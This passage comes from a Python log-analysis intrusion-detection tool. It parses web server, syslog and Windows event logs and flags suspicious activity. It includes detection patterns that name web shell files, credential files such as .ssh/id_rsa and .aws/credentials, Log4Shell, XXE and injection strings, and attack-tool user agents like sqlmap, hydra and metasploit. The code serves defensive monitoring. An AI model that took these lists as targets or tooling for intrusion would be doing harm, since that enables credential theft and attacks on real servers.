     re.compile(r'/(?:c99|r57|wso|b374k|shell|cmd|backdoor|webshell)\w*\.(?:php|asp|aspx|jsp)\b'
                r'|(?:\?|&)(?:cmd|exec|shell)=', re.IGNORECASE), "CRITICAL", "T1505.003"),
    ("Sensitive file access attempt",
     re.compile(r'/(?:\.git/|\.env\b|\.aws/credentials|wp-config\.php|web\.config|\.ssh/id_rsa'
                r'|phpinfo\.php|\.DS_Store|backup\.(?:sql|zip|tar\.gz))', re.IGNORECASE),
     "HIGH", "T1552.001"),
    ("Server-Side Template / Expression Injection",
     re.compile(r'\{\{.*?\}\}|\$\{.*?\}|<%=.*?%>'), "MEDIUM", "T1190"),
    ("Log4Shell / JNDI lookup",
     re.compile(r'\$\{jndi:(?:ldaps?|rmi|dns|iiop)', re.IGNORECASE), "CRITICAL", "T1190"),
    ("XML External Entity",
     re.compile(r'<!ENTITY|<!DOCTYPE[^>]+SYSTEM', re.IGNORECASE), "HIGH", "T1190"),
    ("HTTP Response Splitting",
     re.compile(r'%0d%0a|%0a%0d|\r\n(?:set-cookie|location):', re.IGNORECASE),
     "MEDIUM", "T1190"),
]

# --- Scanner / attack-tool user agents -------------------------------------
SUSPICIOUS_AGENTS: List[Tuple[str, re.Pattern, str]] = [
    ("SQL injection tool (sqlmap)", re.compile(r'sqlmap', re.IGNORECASE), "CRITICAL"),
    ("Web vulnerability scanner (Nikto)", re.compile(r'nikto', re.IGNORECASE), "HIGH"),
    ("Port/service scanner (Nmap NSE)", re.compile(r'nmap\s*(?:scripting|nse)?', re.IGNORECASE), "HIGH"),
    ("Directory brute-forcer", re.compile(r'dirbuster|gobuster|feroxbuster|dirsearch|ffuf|wfuzz',
                                          re.IGNORECASE), "HIGH"),
    ("Credential brute-forcer", re.compile(r'hydra|medusa|patator|ncrack', re.IGNORECASE), "CRITICAL"),
    ("Vulnerability scanner", re.compile(r'nessus|openvas|acunetix|qualys|nuclei|arachni|w3af|zgrab'
                                         r'|masscan|zmap', re.IGNORECASE), "HIGH"),
    ("Exploitation framework", re.compile(r'metasploit|meterpreter|beef|commix|xsser', re.IGNORECASE),
     "CRITICAL"),
    ("Proxy / interception tool", re.compile(r'burp\s*suite|owasp\s*zap|paros|webinspect', re.IGNORECASE),
     "MEDIUM"),
    ("Empty or absent user agent", re.compile(r'^(?:-|)$'), "LOW"),
    ("Scripted client library", re.compile(r'^(?:python-requests|python-urllib|Go-http-client|libwww-perl'
                                           r'|Java/\d|okhttp|axios|curl|Wget)', re.IGNORECASE), "LOW"),
]

RARE_HTTP_METHODS = {"TRACE", "TRACK", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL",
                     "MOVE", "COPY", "LOCK", "UNLOCK", "DEBUG", "SEARCH", "PUT", "DELETE"}


# ===========================================================================
# SECTION 6 - TIMESTAMP PARSING
# ===========================================================================
def parse_apache_timestamp(text: str) -> Optional[datetime]:
    """Parse 10/Oct/2023:13:55:36 -0500 without depending on the system locale."""
    match = RE_APACHE_TS.match(text.strip())
    if not match:
        return None
    month = MONTHS.get(match.group("mon").lower())
    if not month:
        return None
    try:
        return datetime(int(match.group("year")), month, int(match.group("day")),
                        int(match.group("h")), int(match.group("m")), int(match.group("s")))
    except ValueError:
        return None


def parse_syslog_timestamp(mon: str, day: str, h: str, m: str, s: str,
                           assumed_year: int) -> Optional[datetime]:
    """
    Build a datetime from RFC 3164 fields.

    RFC 3164 omits the year entirely, so the year has to be supplied by the
    caller.  The convention used here is: assume the log's own reference year,
    and if that puts the event more than one day in the future, roll back a
    year (which handles a December-to-January file boundary correctly).
    """
    month = MONTHS.get(mon.lower())
    if not month:
        return None
    try:
        stamp = datetime(assumed_year, month, int(day), int(h), int(m), int(s))
    except ValueError:
        return None
    if stamp > datetime.now() + timedelta(days=1):
        try:
            stamp = stamp.replace(year=assumed_year - 1)
        except ValueError:
            return None
    return stamp


def parse_iso_timestamp(text: str) -> Optional[datetime]:
    text = (text or "").strip()
    if not text:
        return None
    cleaned = text.replace("Z", "").split("+")[0]
    if "." in cleaned:
        cleaned = cleaned.split(".")[0]
    for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S", "%Y/%m/%d %H:%M:%S"):
        try:
            return datetime.strptime(cleaned, fmt)
        except ValueError:
            continue
    return None


def parse_windows_timestamp(text: str) -> Optional[datetime]:
    """
    Parse the several shapes PowerShell emits for TimeCreated.

    Export-Csv writes the current culture's short date/time ("10/11/2023
    2:32:52 PM"), ConvertTo-Json writes either ISO 8601 or the legacy
    "/Date(1697031172000)/" tick format.  All three appear in the wild.
    """
    text = (text or "").strip().strip('"')
    if not text:
        return None
    tick = re.match(r'^/Date\((?P<ms>-?\d+)', text)
    if tick:
        try:
            # ConvertTo-Json writes epoch milliseconds. datetime.fromtimestamp
            # (not the deprecated utcfromtimestamp) converts to local time,
            # which keeps these records on the same clock as every other
            # timestamp in the tool - mixing UTC and local would shift these
            # events by the UTC offset and break cross-source correlation.
            return datetime.fromtimestamp(int(tick.group("ms")) / 1000.0)
        except (ValueError, OSError, OverflowError):
            return None
    iso = RE_WIN_ISO_TS.search(text)
    if iso:
        try:
            return datetime(int(iso.group("year")), int(iso.group("mon")), int(iso.group("day")),
                            int(iso.group("h")), int(iso.group("m")), int(iso.group("s")))
        except ValueError:
            return None
    us = RE_WIN_US_TS.search(text)
    if us:
        try:
            hour = int(us.group("h"))
            ampm = (us.group("ampm") or "").lower()
            if ampm == "pm" and hour != 12:
                hour += 12
            elif ampm == "am" and hour == 12:
                hour = 0
            return datetime(int(us.group("year")), int(us.group("mon")), int(us.group("day")),
                            hour, int(us.group("m")), int(us.group("s")))
        except ValueError:
            return None
    return None


# ===========================================================================
# SECTION 7 - PARSERS (pipeline stages 3-5)
# ===========================================================================
class BaseParser:
    """
    Contract shared by every format parser.

    name       - identifier used by --format and in reports
    sniff()    - returns True if a sample line looks like this format; the
                 format detector uses the hit-rate across a sample to choose
    parse()    - returns a normalized Event, or None if the line is not ours
    """
    name = "base"
    is_line_based = True

    def __init__(self, cfg: Config, reference_year: Optional[int] = None) -> None:
        self.cfg = cfg
        self.reference_year = reference_year or datetime.now().year

    def sniff(self, line: str) -> bool:
        raise NotImplementedError

    def parse(self, line: str, line_no: int, path: str) -> Optional[Event]:
        raise NotImplementedError

    # -- shared helper ----------------------------------------------------
    def _finish(self, ev: Event) -> Event:
        ev.src_kind = ip_kind(ev.src_ip)
        if ev.uri and ev.uri_decoded is None:
            # Double-decode: attackers routinely double-encode payloads to slip
            # past naive single-pass filters (%252e%252e%252f -> ../).
            once = unquote_plus(ev.uri)
            ev.uri_decoded = unquote_plus(once)
        return ev


class AccessLogParser(BaseParser):
    """Apache/Nginx Combined + Common Log Format (with optional vhost prefix)."""
    name = "access"

    def sniff(self, line: str) -> bool:
        return bool(RE_ACCESS_COMBINED.match(line))

    def parse(self, line: str, line_no: int, path: str) -> Optional[Event]:
        match = RE_ACCESS_COMBINED.match(line)
        if not match:
            return None
        gd = match.groupdict()
        ev = Event(raw=line, line_no=line_no, source_file=path,
                   source_type=self.name, category="web", action="http_request")
        ev.timestamp = parse_apache_timestamp(gd["ts"] or "")
        ev.src_ip = clean_ip(gd["ip"])
        ev.host = gd.get("vhost")
        if gd.get("user") and gd["user"] != "-":
            ev.user = gd["user"]

        request = (gd.get("request") or "").strip()
        req_match = RE_REQUEST.match(request)
        if req_match:
            ev.method = req_match.group("method")
            ev.uri = req_match.group("uri")
            ev.protocol = req_match.group("proto")
        else:
            # Malformed request lines are themselves a finding (protocol abuse,
            # binary payloads against an HTTP port), so keep them rather than
            # discarding the record.
            ev.uri = request or None
            ev.extra["malformed_request"] = True

        try:
            ev.status = int(gd["status"])
        except (TypeError, ValueError):
            ev.status = None
        size = gd.get("size")
        ev.size = int(size) if size and size.isdigit() else 0

        referrer = gd.get("referrer")
        agent = gd.get("agent")
        ev.referrer = None if referrer in (None, "-", "") else referrer
        ev.user_agent = "" if agent in (None, "-") else agent
        ev.outcome = ("success" if ev.status and ev.status < 400
                      else "failure" if ev.status else "unknown")
        ev.message = f"{ev.method or '?'} {truncate(ev.uri or '', 200)} -> {ev.status}"
        return self._finish(ev)


class ApacheErrorParser(BaseParser):
    name = "apache_error"

    def sniff(self, line: str) -> bool:
        return bool(RE_APACHE_ERROR.match(line))

    def parse(self, line: str, line_no: int, path: str) -> Optional[Event]:
        match = RE_APACHE_ERROR.match(line)
        if not match:
            return None
        gd = match.groupdict()
        ev = Event(raw=line, line_no=line_no, source_file=path,
                   source_type=self.name, category="web", action="server_error")
        ts_match = RE_APACHE_ERR_TS.match((gd.get("ts") or "").strip())
        if ts_match:
            month = MONTHS.get(ts_match.group("mon").lower())
            if month:
                try:
                    ev.timestamp = datetime(int(ts_match.group("year")), month,
                                            int(ts_match.group("day")), int(ts_match.group("h")),
                                            int(ts_match.group("m")), int(ts_match.group("s")))
                except ValueError:
                    ev.timestamp = None
        ev.src_ip = clean_ip(gd.get("client"))
        ev.message = gd.get("msg") or ""
        ev.process = gd.get("mod")
        ev.outcome = "failure"
        ev.extra["level"] = (gd.get("mod") or "").split(":")[-1]
        return self._finish(ev)


class NginxErrorParser(BaseParser):
    name = "nginx_error"

    def sniff(self, line: str) -> bool:
        return bool(RE_NGINX_ERROR.match(line))

    def parse(self, line: str, line_no: int, path: str) -> Optional[Event]:
        match = RE_NGINX_ERROR.match(line)
        if not match:
            return None
        gd = match.groupdict()
        ev = Event(raw=line, line_no=line_no, source_file=path,
                   source_type=self.name, category="web", action="server_error")
        try:
            ev.timestamp = datetime.strptime(gd["ts"], "%Y/%m/%d %H:%M:%S")
        except (ValueError, TypeError):
            ev.timestamp = None
        message = gd.get("msg") or ""
        ev.message = message
        ev.extra["level"] = gd.get("level")
        client = RE_NGINX_CLIENT.search(message)
        if client:
            ev.src_ip = clean_ip(client.group("ip"))
        request = RE_NGINX_REQUEST.search(message)
        if request:
            req_match = RE_REQUEST.match(request.group("request").strip())
            if req_match:
                ev.method = req_match.group("method")
                ev.uri = req_match.group("uri")
        ev.outcome = "failure"
        return self._finish(ev)


class SyslogParser(BaseParser):
    """
    RFC 3164 and RFC 5424 syslog, including Linux auth.log / secure.

    Once the envelope is stripped, the message body is run through the
    AUTH_PATTERNS table to classify authentication semantics; this is what
    turns a plain text line into an event the auth detectors can consume.
    """
    name = "syslog"

    def sniff(self, line: str) -> bool:
        return bool(RE_SYSLOG_5424.match(line) or RE_SYSLOG_3164.match(line))

    def parse(self, line: str, line_no: int, path: str) -> Optional[Event]:
        ev: Optional[Event] = None
        match5424 = RE_SYSLOG_5424.match(line)
        if match5424:
            gd = match5424.groupdict()
            ev = Event(raw=line, line_no=line_no, source_file=path,
                       source_type=self.name, category="system")
            ev.timestamp = parse_iso_timestamp(gd.get("ts") or "")
            ev.host = gd.get("host")
            ev.process = gd.get("app")
            ev.message = gd.get("msg") or ""
            ev.extra["syslog_version"] = 5424
        else:
            match3164 = RE_SYSLOG_3164.match(line)
            if not match3164:
                return None
            gd = match3164.groupdict()
            ev = Event(raw=line, line_no=line_no, source_file=path,
                       source_type=self.name, category="system")
            ev.timestamp = parse_syslog_timestamp(gd["mon"], gd["day"], gd["h"], gd["m"],
                                                  gd["s"], self.reference_year)
            ev.host = gd.get("host")
            ev.process = gd.get("proc")
            ev.message = gd.get("msg") or ""
            ev.extra["syslog_version"] = 3164
            if gd.get("pid"):
                ev.extra["pid"] = gd["pid"]

        self._classify_auth(ev)
        return self._finish(ev)

    def _classify_auth(self, ev: Event) -> None:
        """Second-stage regex pass: give the free-text message a security meaning."""
        message = ev.message
        for action, outcome, note, pattern in AUTH_PATTERNS:
            match = pattern.search(message)
            if not match:
                continue
            groups = match.groupdict()
            ev.action = action
            ev.outcome = outcome
            ev.category = "auth"
            ev.extra["signature"] = note
            user = groups.get("user") or groups.get("ruser")
            if user and user not in ("", "-"):
                ev.user = user.strip()
            ip = clean_ip(groups.get("ip"))
            if ip:
                ev.src_ip = ip
            for key in ("target", "group", "command"):
                if groups.get(key):
                    ev.extra[key] = groups[key]
            if "invalid user" in message.lower() or note == "ssh_invalid_user":
                ev.extra["invalid_user"] = True
            break
        else:
            ev.action = "log_message"
        # Last resort: recover a source address from anywhere in the message so
        # that non-authentication lines still contribute to IP-based analytics.
        if not ev.src_ip:
            found = RE_IP_ANY.search(message)
            if found:
                ev.src_ip = clean_ip(found.group(0))


class WindowsEventParser(BaseParser):
    """
    Windows Event Log records exported to CSV or JSON.

    Typical producers:
        Get-WinEvent -LogName Security -MaxEvents 5000 |
            Select-Object TimeCreated,Id,LevelDisplayName,ProviderName,
                          MachineName,Message | Export-Csv -NoTypeInformation ev.csv
        Get-WinEvent -LogName Security | ConvertTo-Json -Depth 3 > ev.json

    This parser is record-based rather than line-based because a single event
    message spans many physical lines; the reader feeds it whole dictionaries.
    """
    name = "winevent"
    is_line_based = False

    FIELD_ALIASES = {
        "timestamp": ("TimeCreated", "TimeGenerated", "Time Created", "Date and Time", "Timestamp"),
        "event_id": ("Id", "EventID", "Event ID", "InstanceId"),
        "provider": ("ProviderName", "Source", "Provider Name", "LogName"),
        "machine": ("MachineName", "Computer", "ComputerName", "Machine Name"),
        "level": ("LevelDisplayName", "Level", "Type", "Keywords"),
        "message": ("Message", "Description", "EventData"),
    }

    def sniff(self, line: str) -> bool:
        low = line.lower()
        return ("timecreated" in low and ("id" in low or "eventid" in low)) or \
               ('"id"' in low and "message" in low)

    def parse_record(self, record: Dict[str, Any], line_no: int, path: str) -> Optional[Event]:
        def pick(field_name: str) -> str:
            for alias in self.FIELD_ALIASES[field_name]:
                for key, value in record.items():
                    if key and key.strip().lower() == alias.lower() and value not in (None, ""):
                        return str(value)
            return ""

        raw_id = pick("event_id")
        digits = re.search(r'\d+', raw_id)
        if not digits:
            return None
        event_id = int(digits.group(0))
        message = pick("message").replace("\r\n", "\n")

        # Evidence lines are read by a human, so reconstruct a compact single-line
        # rendering of the record rather than storing the JSON/CSV dict verbatim.
        ev = Event(raw="", line_no=line_no, source_file=path, source_type=self.name,
                   category="system", event_id=event_id)
        ev.timestamp = parse_windows_timestamp(pick("timestamp"))
        ev.provider = pick("provider") or None
        ev.host = pick("machine") or None
        ev.message = truncate(message.replace("\n", " | "), 500)
        ev.extra["level"] = pick("level")
        ev.extra["full_message"] = message

        action, outcome, description = WIN_EVENT_MEANING.get(
            event_id, ("windows_event", "unknown", f"Event ID {event_id}"))
        ev.action = action
        ev.outcome = outcome
        ev.extra["description"] = description
        if action in ("login_success", "login_failure", "account_created", "group_modified",
                      "account_lockout", "privileged_logon", "explicit_creds", "password_reset",
                      "account_deleted", "account_disabled"):
            ev.category = "auth"

        # Extract the structured fields Windows buries inside the message body.
        target = RE_WIN_TARGET_ACCOUNT.search(message)
        accounts = [a.strip() for a in RE_WIN_ACCOUNT.findall(message)
                    if a.strip() not in ("-", "")]
        if target and target.group("v").strip() not in ("-", ""):
            ev.user = target.group("v").strip()
        elif accounts:
            # 4625 lists the Subject account first and the targeted account
            # second; the targeted account is the one under attack.
            ev.user = accounts[-1]
        addr = RE_WIN_SRC_ADDR.search(message)
        if addr:
            ev.src_ip = clean_ip(addr.group("v"))
        if not ev.src_ip:
            workstation = RE_WIN_WORKSTATION.search(message)
            if workstation and workstation.group("v").strip() not in ("-", ""):
                ev.extra["workstation"] = workstation.group("v").strip()
        logon = RE_WIN_LOGON_TYPE.search(message)
        if logon:
            ev.logon_type = logon.group("v")
        status = RE_WIN_STATUS.search(message)
        if status:
            ev.extra["status"] = truncate(status.group("v").strip(), 80)
        service = RE_WIN_SERVICE.search(message)
        if service:
            ev.extra["service"] = truncate(service.group("v").strip(), 120)

        summary = re.sub(r'\s+', " ", message).strip()
        ev.raw = (f"{ev.when} EventID={event_id} "
                  f"host={ev.host or '-'} "
                  f"account={ev.user or '-'} "
                  f"source={ev.src_ip or ev.extra.get('workstation', '-')} "
                  f"| {truncate(summary, 260)}")
        return self._finish(ev)

    def parse(self, line: str, line_no: int, path: str) -> Optional[Event]:
        """Support one-JSON-object-per-line (JSON Lines) inputs as well."""
        line = line.strip().rstrip(",")
        if not line.startswith("{"):
            return None
        try:
            record = json.loads(line)
        except json.JSONDecodeError:
            return None
        return self.parse_record(record, line_no, path) if isinstance(record, dict) else None


class GenericParser(BaseParser):
    """
    Last-resort parser so no line is silently discarded.

    It pulls a timestamp and an IP address if any are present and applies the
    authentication signature table.  A line that reaches this parser still
    contributes to volume statistics and IOC extraction even though its
    structure was not recognized.
    """
    name = "generic"

    def sniff(self, line: str) -> bool:
        return bool(line.strip())

    def parse(self, line: str, line_no: int, path: str) -> Optional[Event]:
        if not line.strip():
            return None
        ev = Event(raw=line, line_no=line_no, source_file=path, source_type=self.name,
                   category="other", action="log_message", message=line.strip())
        ev.timestamp = parse_iso_timestamp(line[:19]) or None
        found = RE_IP_ANY.search(line)
        if found:
            ev.src_ip = clean_ip(found.group(0))
        for action, outcome, note, pattern in AUTH_PATTERNS:
            match = pattern.search(line)
            if match:
                ev.action, ev.outcome, ev.category = action, outcome, "auth"
                ev.extra["signature"] = note
                user = match.groupdict().get("user")
                if user:
                    ev.user = user
                ip = clean_ip(match.groupdict().get("ip"))
                if ip:
                    ev.src_ip = ip
                break
        return self._finish(ev)


PARSER_CLASSES: List[type] = [
    AccessLogParser, NginxErrorParser, ApacheErrorParser,
    SyslogParser, WindowsEventParser, GenericParser,
]
PARSER_BY_NAME = {cls.name: cls for cls in PARSER_CLASSES}
PARSER_BY_NAME["winevent_csv"] = WindowsEventParser
PARSER_BY_NAME["winevent_json"] = WindowsEventParser


# ===========================================================================
# SECTION 8 - FORMAT DETECTION + INGESTION (pipeline stages 1-2)
# ===========================================================================
class LogIngestor:
    """
    Stage 1+2 of the pipeline: turn a list of paths into a list of Events.

    Format selection is per-file and evidence-based: the first 200 non-blank
    lines are scored against each candidate parser and the highest hit-rate
    wins, with a fallback to the generic parser.  This means a directory of
    mixed Apache, syslog and Windows exports can be analyzed in one run.
    """

    def __init__(self, cfg: Config, forced_format: str = "auto") -> None:
        self.cfg = cfg
        self.forced_format = forced_format
        self.stats = ParseStats()

    # -- detection --------------------------------------------------------
    def detect_format(self, path: str) -> str:
        if self.forced_format != "auto":
            return self.forced_format
        lower = path.lower()
        if lower.endswith(".csv") or lower.endswith(".csv.gz"):
            return "winevent_csv"
        if lower.endswith(".json") or lower.endswith(".json.gz"):
            return "winevent_json"

        sample: List[str] = []
        try:
            for _idx, line in read_lines(path):
                if line.strip():
                    sample.append(line)
                if len(sample) >= 200:
                    break
        except OSError as exc:
            warn(f"cannot read {path}: {exc}")
            return "generic"
        if not sample:
            return "generic"

        # A JSON array export has no per-line structure, so it must be detected
        # before per-line scoring. The test has to be tighter than "starts with
        # a bracket": an Apache error log opens with [Tue Sep 08 ...] and would
        # otherwise be misrouted to the JSON reader and silently produce zero
        # events. Require the bracket to be followed by an object.
        head = sample[0].lstrip()
        head_block = " ".join(sample[:5])
        if head.startswith("[{"):
            return "winevent_json"
        if head == "[" and len(sample) > 1 and sample[1].lstrip().startswith("{"):
            return "winevent_json"
        if head.startswith("{") and ('"Id"' in head_block or '"EventID"' in head_block):
            return "winevent_json"

        scores: Dict[str, float] = {}
        for cls in PARSER_CLASSES:
            if cls is GenericParser:
                continue
            parser = cls(self.cfg)
            hits = sum(1 for line in sample if parser.sniff(line))
            scores[cls.name] = hits / len(sample)
        best = max(scores, key=lambda k: scores[k])
        debug(f"format scores for {os.path.basename(path)}: "
              + ", ".join(f"{k}={v:.2f}" for k, v in sorted(scores.items(),
                                                            key=lambda kv: -kv[1])))
        return best if scores[best] >= 0.30 else "generic"

    # -- reference year ---------------------------------------------------
    @staticmethod
    def _reference_year(path: str) -> int:
        """
        Choose the year to assume for year-less syslog timestamps.

        The file's modification time is a far better estimate than 'now' when
        analyzing archived logs, which is the common case in an investigation.
        """
        try:
            return datetime.fromtimestamp(os.path.getmtime(path)).year
        except OSError:
            return datetime.now().year

    # -- ingestion --------------------------------------------------------
    def ingest(self, paths: Sequence[str]) -> List[Event]:
        events: List[Event] = []
        for path in paths:
            fmt = self.detect_format(path)
            info(f"parsing {C.BOLD}{os.path.basename(path)}{C.RESET} "
                 f"(format: {C.CYAN}{fmt}{C.RESET})")
            self.stats.files += 1
            try:
                if fmt == "winevent_csv":
                    file_events = self._ingest_csv(path)
                elif fmt == "winevent_json":
                    file_events = self._ingest_json(path)
                else:
                    file_events = self._ingest_lines(path, fmt)
            except OSError as exc:
                error(f"failed reading {path}: {exc}")
                continue
            self.stats.by_file[os.path.basename(path)] += len(file_events)
            events.extend(file_events)
        self._assign_order_keys(events)
        return events

    def _ingest_lines(self, path: str, fmt: str) -> List[Event]:
        parser_cls = PARSER_BY_NAME.get(fmt, GenericParser)
        parser = parser_cls(self.cfg, reference_year=self._reference_year(path))
        fallback = GenericParser(self.cfg, reference_year=self._reference_year(path))
        out: List[Event] = []
        for line_no, line in read_lines(path):
            self.stats.total_lines += 1
            if not line.strip():
                self.stats.blank_lines += 1
                continue
            ev = parser.parse(line, line_no, path)
            if ev is None:
                ev = fallback.parse(line, line_no, path)
                if ev is None:
                    self.stats.note_unparsed(path, line_no, line)
                    continue
                self.stats.note_unparsed(path, line_no, line)
            else:
                self.stats.parsed += 1
            self.stats.by_source_type[ev.source_type] += 1
            out.append(ev)
        return out

    def _ingest_csv(self, path: str) -> List[Event]:
        parser = WindowsEventParser(self.cfg)
        out: List[Event] = []
        encoding = detect_encoding(path)
        opener = gzip.open if path.lower().endswith(".gz") else open
        with opener(path, "rt", encoding=encoding, errors="replace", newline="") as fh:  # type: ignore[operator]
            try:
                reader = csv.DictReader(fh)
                for idx, record in enumerate(reader, start=2):
                    self.stats.total_lines += 1
                    ev = parser.parse_record(record, idx, path)
                    if ev is None:
                        self.stats.note_unparsed(path, idx, str(record)[:120])
                        continue
                    self.stats.parsed += 1
                    self.stats.by_source_type[ev.source_type] += 1
                    out.append(ev)
            except csv.Error as exc:
                error(f"CSV error in {path}: {exc}")
        return out

    def _ingest_json(self, path: str) -> List[Event]:
        parser = WindowsEventParser(self.cfg)
        out: List[Event] = []
        encoding = detect_encoding(path)
        opener = gzip.open if path.lower().endswith(".gz") else open
        with opener(path, "rt", encoding=encoding, errors="replace") as fh:  # type: ignore[operator]
            text = fh.read()
        self.stats.total_lines += text.count("\n") + 1
        records: List[Dict[str, Any]] = []
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                records = [data]
            elif isinstance(data, list):
                records = [r for r in data if isinstance(r, dict)]
        except json.JSONDecodeError:
            # JSON Lines fallback - one object per line
            for line in text.splitlines():
                line = line.strip().rstrip(",")
                if line.startswith("{"):
                    try:
                        obj = json.loads(line)
                        if isinstance(obj, dict):
                            records.append(obj)
                    except json.JSONDecodeError:
                        continue
        for idx, record in enumerate(records, start=1):
            ev = parser.parse_record(record, idx, path)
            if ev is None:
                self.stats.note_unparsed(path, idx, str(record)[:120])
                continue
            self.stats.parsed += 1
            self.stats.by_source_type[ev.source_type] += 1
            out.append(ev)
        return out

    @staticmethod
    def _assign_order_keys(events: List[Event]) -> None:
        """
        Give every event a monotonic numeric key for windowing.

        Events with real timestamps use POSIX time.  Events whose timestamp
        could not be parsed inherit the last known good timestamp plus a small
        offset, so they stay in file order and still participate in sliding
        window logic instead of being dropped from analysis entirely.
        """
        last_known: Optional[float] = None
        drift = 0.0
        for ev in events:
            if ev.timestamp is not None:
                last_known = ev.timestamp.timestamp()
                drift = 0.0
                ev.order_key = last_known
            else:
                drift += 0.001
                ev.order_key = (last_known + drift) if last_known is not None else drift
        events.sort(key=lambda e: e.order_key)


# ===========================================================================
# SECTION 9 - ALERT MODEL
# ===========================================================================
@dataclass
class Alert:
    """A single finding, carrying enough context to be actionable on its own."""
    rule_id: str
    title: str
    severity: str
    category: str
    entity: str                       # the IP / account / URI the alert is about
    entity_type: str                  # "ip" | "user" | "uri" | "host" | "global"
    count: int
    threshold: str                    # human-readable statement of what was exceeded
    description: str
    recommendation: str
    mitre: str = ""
    first_seen: Optional[datetime] = None
    last_seen: Optional[datetime] = None
    evidence: List[str] = field(default_factory=list)
    related: Dict[str, Any] = field(default_factory=dict)

    @property
    def rank(self) -> int:
        return SEVERITY_RANK.get(self.severity, 0)

    def window_text(self) -> str:
        if not self.first_seen or not self.last_seen:
            return "unknown window"
        if self.first_seen == self.last_seen:
            return self.first_seen.strftime("%Y-%m-%d %H:%M:%S")
        span = (self.last_seen - self.first_seen).total_seconds()
        return (f"{self.first_seen.strftime('%Y-%m-%d %H:%M:%S')} -> "
                f"{self.last_seen.strftime('%H:%M:%S')} ({int(span)}s)")

    def to_dict(self) -> Dict[str, Any]:
        return {
            "rule_id": self.rule_id,
            "title": self.title,
            "severity": self.severity,
            "category": self.category,
            "entity": self.entity,
            "entity_type": self.entity_type,
            "observation_count": self.count,
            "threshold": self.threshold,
            "description": self.description,
            "recommendation": self.recommendation,
            "mitre_attack": self.mitre,
            "first_seen": self.first_seen.isoformat() if self.first_seen else None,
            "last_seen": self.last_seen.isoformat() if self.last_seen else None,
            "evidence": self.evidence,
            "related": self.related,
        }


# ===========================================================================
# SECTION 10 - SLIDING WINDOW PRIMITIVE
# ===========================================================================
class SlidingWindow:
    """
    Per-key sliding time window with threshold tracking.

    This is the workhorse behind every rate-based rule.  For each key it keeps
    a deque of (order_key, event); on every insert, entries older than the
    window are evicted from the left.  If the surviving population reaches the
    threshold, the burst is recorded - peak size, first/last event and a few
    evidence lines - and the same key is never allowed to spam a second alert.

    Complexity is O(1) amortized per event because each event is appended and
    popped at most once.
    """

    def __init__(self, window_seconds: int, threshold: int, max_evidence: int = 4) -> None:
        self.window = float(window_seconds)
        self.threshold = threshold
        self.max_evidence = max_evidence
        self._buckets: Dict[str, deque] = defaultdict(deque)
        self.bursts: Dict[str, Dict[str, Any]] = {}

    def add(self, key: str, ev: Event) -> bool:
        """Insert an event; return True when this insert crosses the threshold."""
        bucket = self._buckets[key]
        bucket.append((ev.order_key, ev))
        cutoff = ev.order_key - self.window
        while bucket and bucket[0][0] < cutoff:
            bucket.popleft()

        size = len(bucket)
        if size < self.threshold:
            return False

        record = self.bursts.get(key)
        if record is None:
            record = {
                "peak": size,
                "total": 0,
                "first": bucket[0][1].timestamp,
                "last": ev.timestamp,
                "evidence": [],
                "events": [],
                "users": set(),
                "first_key": bucket[0][0],
            }
            self.bursts[key] = record
            for _order, sample in list(bucket)[: self.max_evidence]:
                record["evidence"].append(f"{sample.location()} | {truncate(sample.raw, 200)}")
        record["peak"] = max(record["peak"], size)
        record["last"] = ev.timestamp or record["last"]
        record["total"] += 1
        if ev.user:
            record["users"].add(ev.user)
        if len(record["events"]) < 200:
            record["events"].append(ev)
        return size == self.threshold          # only True on the crossing event

    def keys(self) -> Iterable[str]:
        return self.bursts.keys()


class DistinctWindow:
    """
    Sliding window over *distinct values* rather than raw counts.

    Password spraying and directory enumeration are not about how many
    requests arrive, they are about how many different accounts or paths a
    single source touches, so the threshold has to be applied to a set.
    """

    def __init__(self, window_seconds: int, threshold: int, max_evidence: int = 4) -> None:
        self.window = float(window_seconds)
        self.threshold = threshold
        self.max_evidence = max_evidence
        self._buckets: Dict[str, deque] = defaultdict(deque)
        self.hits: Dict[str, Dict[str, Any]] = {}

    def add(self, key: str, value: str, ev: Event) -> bool:
        bucket = self._buckets[key]
        bucket.append((ev.order_key, value, ev))
        cutoff = ev.order_key - self.window
        while bucket and bucket[0][0] < cutoff:
            bucket.popleft()

        distinct = {v for _o, v, _e in bucket}
        if len(distinct) < self.threshold:
            return False

        record = self.hits.get(key)
        if record is None:
            record = {"peak": 0, "first": bucket[0][2].timestamp, "last": ev.timestamp,
                      "values": set(), "evidence": [], "events": []}
            self.hits[key] = record
            for _o, _v, sample in list(bucket)[: self.max_evidence]:
                record["evidence"].append(f"{sample.location()} | {truncate(sample.raw, 200)}")
        record["peak"] = max(record["peak"], len(distinct))
        record["values"].update(distinct)
        record["last"] = ev.timestamp or record["last"]
        if len(record["events"]) < 200:
            record["events"].append(ev)
        return len(distinct) == self.threshold


# ===========================================================================
# SECTION 11 - DETECTOR FRAMEWORK
# ===========================================================================
@dataclass
class AnalysisContext:
    """Shared read-only state made available to every detector at finalize time."""
    cfg: Config
    events: List[Event]
    stats: ParseStats
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None
    ip_counter: Counter = field(default_factory=Counter)
    user_counter: Counter = field(default_factory=Counter)
    status_counter: Counter = field(default_factory=Counter)
    category_counter: Counter = field(default_factory=Counter)
    ip_error_counter: Counter = field(default_factory=Counter)
    ip_bytes: Counter = field(default_factory=Counter)
    ip_first_seen: Dict[str, datetime] = field(default_factory=dict)
    ip_timeline: Dict[str, List[float]] = field(default_factory=lambda: defaultdict(list))
    hour_histogram: Counter = field(default_factory=Counter)


class Detector:
    """
    Base class for all detection analytics.

    Detectors are single-pass: feed() is called once per event in chronological
    order and must be cheap; finalize() is called once at the end and returns
    the alerts.  Keeping the interface this narrow means new rules can be added
    without touching the pipeline.
    """
    rule_id = "BASE"
    name = "Base detector"
    category = "other"

    def __init__(self, cfg: Config) -> None:
        self.cfg = cfg

    def feed(self, ev: Event) -> None:
        raise NotImplementedError

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        return []

    # -- helpers ----------------------------------------------------------
    @staticmethod
    def evidence_from(events: Sequence[Event], limit: int) -> List[str]:
        return [f"{e.location()} | {truncate(e.raw, 200)}" for e in events[:limit]]


# ===========================================================================
# SECTION 12 - AUTHENTICATION DETECTORS
# ===========================================================================
class BruteForceDetector(Detector):
    """
    Repeated failed logins - the assignment's headline requirement.

    Four related but distinct patterns are separated because they call for
    different responses:

